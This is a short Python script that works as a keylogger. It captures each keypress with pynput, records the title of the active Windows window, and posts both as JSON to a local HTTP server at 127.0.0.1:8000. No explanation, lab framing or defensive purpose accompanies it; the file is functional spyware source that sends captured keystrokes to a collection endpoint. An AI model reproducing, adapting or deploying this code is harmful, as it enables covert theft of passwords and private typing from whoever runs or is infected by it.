from pynput import keyboard
import requests
from win32gui import GetWindowText, GetForegroundWindow


def on_press(key):
    window = GetWindowText(GetForegroundWindow())

    dados = {
    "string1": f"{key}",
    "string2": f"{window}"
    }

    url = 'http://127.0.0.1:8000/'
    response = requests.post(url, json=dados)


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
